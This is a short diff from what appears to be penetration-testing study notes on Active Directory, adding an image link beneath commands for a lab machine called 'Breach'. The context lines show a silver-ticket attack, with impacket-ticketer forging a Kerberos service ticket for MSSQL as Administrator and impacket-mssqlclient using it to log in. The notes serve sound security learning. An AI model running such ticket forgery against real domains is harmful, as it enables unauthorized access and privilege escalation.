@@ -118,4 +118,4 @@ impacket-ticketer -spn MSSQLSvc/breachdc.breach.vl -domain-sid S-1-5-21-23306927
 export KRB5CCNAME=Administrator.ccache
 impacket-mssqlclient -k -no-pass -windows-auth breachdc.breach.vl
 ```
-![alt text]()
+![alt text](https://github.com/milouzevich/CPTS/blob/main/AD/images/Pasted%20image%2020260804170104.png)
